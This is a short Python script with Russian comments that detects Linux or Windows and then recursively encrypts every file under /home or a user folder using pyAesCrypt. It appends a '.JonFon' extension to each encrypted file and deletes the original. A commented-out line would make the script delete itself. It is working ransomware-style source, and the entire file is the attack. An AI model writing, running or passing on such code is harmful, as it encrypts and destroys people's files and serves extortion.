import pyAesCrypt
import os
import sys
import re
import platform
#у линукса будет шифроваться /home
#переменная пути
dir_enc=''
#функция детекта ос
def os_detect():
	global dir_enc
	if re.search('linux',str(platform.uname()).lower()):
		print('os is linux')
		dir_enc='/home'
	elif re.search('windows',str(platform.uname()).lower()):
		user=os.getlogin()
		print('os is windows')
		dir_enc=r"C:\\Users\\chech\\" #Тут папку которую надо шифровать, можете поставить input если вам удобно так
# crypt
def encryption(file, password):

    # Buffer
    buffer_size = 512 * 1024

    #Crypt
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".JonFon",
        password,
        buffer_size
    )
    print("...")
    os.remove(file) #deleter
# scanner
def walking_by_dirs(dir, password):
    # перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        #шифруем файл
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        #повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)

password = input("Пароль для шифровки/дешифровки?")
os_detect()
walking_by_dirs(dir_enc, password)
# os.remove(str(sys.argv[0]))
